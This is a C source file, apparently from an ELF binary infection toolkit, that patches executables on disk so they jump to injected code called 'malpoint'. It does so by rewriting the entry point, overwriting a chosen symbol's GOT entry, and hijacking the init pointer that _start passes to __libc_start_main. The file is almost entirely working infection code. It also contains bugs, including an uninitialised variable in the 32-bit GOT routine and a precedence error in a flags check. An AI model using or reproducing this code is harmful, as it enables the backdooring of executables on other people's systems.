#include "elfit.h"

int entry_redirect_32(Elfit_t *host, uint32_t malpoint)
{
    int ofd, c;
    Elf32_Ehdr *ehdr;
    
    printf("[+ ENTRY_POINT REDIR]\tPatching host's entrypoint to 0x%x\n", malpoint);

    ehdr = (Elf32_Ehdr *) host->mem;

    ehdr->e_entry = malpoint;

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
        < 0)
    {
        perror("tmp binary: open");
        return -1; 
    }

    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
    {
        perror("tmp binary: write");
        return -1;
    }

    rename(TMP, host->name);
    return 1;
}

int entry_redirect_64(Elfit_t *host, uint64_t malpoint)
{
    int ofd, c;
    Elf64_Ehdr *ehdr;
    
    printf("[+ ENTRY_POINT REDIR]\tPatching host's entrypoint to 0x%x\n", malpoint);

    ehdr = (Elf64_Ehdr *) host->mem;

    ehdr->e_entry = malpoint;

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
        < 0)
    {
        perror("tmp binary: open");
        return -1; 
    }

    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
    {
        perror("tmp binary: write");
        return -1;
    }

    rename(TMP, host->name);
    return 1;
}

Elf32_Addr got_redirect_32(Elfit_t *host, char *target, uint32_t malpoint)
{
    Elf32_Ehdr *ehdr;
    Elf32_Shdr *shdr;
    Elf32_Phdr *phdr;
    Elf32_Rel *rel;
    Elf32_Sym *dynsym;
    char *dynstr;
    int i, c, ofd; 
    int relindex, dynsymindex, dynstrindex;
    Elf32_Addr data_vaddr, gotptr;
    Elf32_Off data_offset, relocptr;

    ehdr = (Elf32_Ehdr *) host->mem;     
    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff); 
    shdr = (Elf32_Shdr *) (host->mem + ehdr->e_shoff);

    if ((relindex = get_section_by_name_32(".rel.plt", host)) == -1)
    {
        printf("could not find relocation table\n");
        return -1;
    }
    rel = (Elf32_Rel *) (host->mem + shdr[relindex].sh_offset);

    if ((dynsymindex = get_section_by_name_32(".dynsym", host)) == -1)
    {
        printf("could not find dynamic symbol table\n");
        return -1;
    }
    dynsym = (Elf32_Sym *) (host->mem + shdr[dynsymindex].sh_offset);

    if ((dynstrindex = get_section_by_name_32(".dynstr", host)) == -1)
    {
        printf("could not find dynamic string table\n");
        return -1;
    }
    dynstr = (char *) (host->mem + shdr[dynstrindex].sh_offset);

    for(i = 0; i < (shdr[relindex].sh_size / sizeof(Elf32_Rel)); i++)
    {
        if (strcmp(&dynstr[dynsym[ELF32_R_SYM(rel[i].r_info)].st_name], target) == 0)
        {
            gotptr = (Elf32_Addr) rel[i].r_offset; /* vaddr of position to patch */
        }
    }

    if (!gotptr)
    {
        printf("could not retrieve got entry for the specified symbol\n");
        return -1;
    }

    /* grab data segment information */
    for(i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdr[i].p_type == PT_LOAD)
        {
            data_vaddr = phdr[i+1].p_vaddr;
            data_offset = phdr[i+1].p_offset;
            break;
        }
    }

    relocptr = data_offset + ((Elf32_Off) (gotptr - data_vaddr));

    printf("[+ .GOT REDIR]\t\tPatching 0x%x (offset 0x%x) with 0x%x\n",
        gotptr, relocptr,  malpoint);
    *(unsigned long*)&host->mem[relocptr] = malpoint;

    /* writing changes to a file */
    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
        < 0)
    {
        perror("tmp binary: open");
        return -1; 
    }

    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
    {
        perror("tmp binary: write");
        return -1;
    }

    rename(TMP, host->name);
    
    return gotptr;
}

Elf64_Addr got_redirect_64(Elfit_t *host, char *target, uint64_t malpoint)
{
    Elf64_Ehdr *ehdr;
    Elf64_Shdr *shdr;
    Elf64_Phdr *phdr;
    Elf64_Rela *rel;
    Elf64_Sym *dynsym;
    char *dynstr;
    int i, c, ofd; 
    int relindex, dynsymindex, dynstrindex;
    Elf64_Addr data_vaddr, gotptr;
    Elf64_Off data_offset, relocptr;

    ehdr = (Elf64_Ehdr *) host->mem;     
    phdr = (Elf64_Phdr *) (host->mem + ehdr->e_phoff); 
    shdr = (Elf64_Shdr *) (host->mem + ehdr->e_shoff);

    if ((relindex = get_section_by_name_64(".rela.plt", host)) == -1)
    {
        printf("could not find relocation table\n");
        return -1;
    }
    rel = (Elf64_Rela *) (host->mem + shdr[relindex].sh_offset);

    if ((dynsymindex = get_section_by_name_64(".dynsym", host)) == -1)
    {
        printf("could not find dynamic symbol table\n");
        return -1;
    }
    dynsym = (Elf64_Sym *) (host->mem + shdr[dynsymindex].sh_offset);

    if ((dynstrindex = get_section_by_name_64(".dynstr", host)) == -1)
    {
        printf("could not find dynamic string table\n");
        return -1;
    }
    dynstr = (char *) (host->mem + shdr[dynstrindex].sh_offset);

    gotptr = 0x0;
    for(i = 0; i < (shdr[relindex].sh_size / sizeof(Elf64_Rela)); i++)
    {
        if (strcmp(&dynstr[dynsym[ELF64_R_SYM(rel[i].r_info)].st_name], target) == 0)
        {
            gotptr = (Elf64_Addr) rel[i].r_offset; /* vaddr of position to patch */
        }
    }

    if (!gotptr)
    {
        printf("could not retrieve got entry for the specified symbol\n");
        return -1;
    }

    /* grab data segment information */
    for(i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdr[i].p_type == PT_LOAD)
        {
            data_vaddr = phdr[i+1].p_vaddr;
            data_offset = phdr[i+1].p_offset;
            break;
        }
    }

    relocptr = data_offset + ((Elf64_Off) (gotptr - data_vaddr));

    printf("[+ .GOT REDIR]\t\tPatching 0x%x (offset 0x%x) with 0x%x\n",
        gotptr, relocptr,  malpoint);
    *(unsigned long*)&host->mem[relocptr] = malpoint;

    /* writing changes to a file */
    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
        < 0)
    {
        perror("tmp binary: open");
        return -1; 
    }

    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
    {
        perror("tmp binary: write");
        return -1;
    }

    rename(TMP, host->name);
    
    return gotptr;
}

int libc_start_main_hijack_32(Elfit_t *host, uint32_t malpoint)
{
    Elf32_Ehdr *ehdr; 
    Elf32_Phdr *phdr;
    Elf32_Addr startaddr; 
    unsigned char *startoff;
    uint32_t hltoff;
    int ofd;
    int i, pushes, pushfound, c;

    ehdr = (Elf32_Ehdr *) host->mem;
    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff);

    startaddr = ehdr->e_entry;
    
    /* get offset of _start */
    for(i = 0; i < ehdr->e_phnum; i++, phdr++) 
    {
        if (phdr->p_type == PT_LOAD && phdr->p_flags == PF_R | PF_X)
        {
            startoff = host->mem + phdr->p_offset + (startaddr - phdr->p_vaddr);
            break;
        }
    }

    
    /* start for _start and begin looking for pushes to the stack
     * the 5th push we see (on 32bit) will be pushing a pointer to a to
     * __libc_csu_init. This is where we'll insert our malpoint */
    pushes = 0;
    pushfound = 0;
    for(i = 0; i < MAX_SEARCH_LEN; i++)
    {
        /* pushing a register */
        if (startoff[i] >= 0x50 && startoff[i] <= 0x59)
        {
            pushes++;
        }
        /* pushing an address */
        if (startoff[i] == 0x68)
        {
            if (pushes == 4)
            {
                *(uint32_t *)&startoff[i+1] = malpoint;
                printf("[+ LIBC ARG HIJACK]\tHijacking init pointer to 0x%x\n",
                    malpoint);
                pushfound = 1;
            }
            pushes++;
        }
    }
    if (!pushfound)
    {
        printf("[-] correct push instruction could not be located\n");
    }

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
        < 0)
    {
        perror("tmp binary: open");
        return -1; 
    }

    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
    {
        perror("tmp binary: write");
        return -1;
    }

    rename(TMP, host->name);
    
       return -1; 
}
